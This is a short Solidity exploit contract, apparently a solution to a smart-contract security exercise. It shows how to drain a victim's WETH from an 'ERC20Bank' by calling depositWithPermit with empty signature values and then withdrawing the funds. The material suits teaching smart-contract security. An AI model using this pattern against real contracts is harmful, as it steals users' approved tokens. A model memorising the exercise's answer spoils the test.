// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// ERC20Bank can transfer from Alice infinite amount of WETH

interface IERC20Bank {
    function depositWithPermit(
        address owner,
        address spender,
        uint amount,
        uint deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
    
    function withdraw(uint _amount) external;
}

contract ERC20BankExploit {
    address private immutable target;

    constructor(address _target) {
        target = _target;
    }

    // must transfer all alice's WETH to this contract.
    function pwn(address alice) external {
        // Write your code here
        IERC20Bank _target = IERC20Bank(target);
        _target.depositWithPermit(alice, address(this), 9 ether, block.timestamp, 0, bytes32(uint256(0)), bytes32(uint256(0)));
        _target.withdraw(9 ether);
    }
}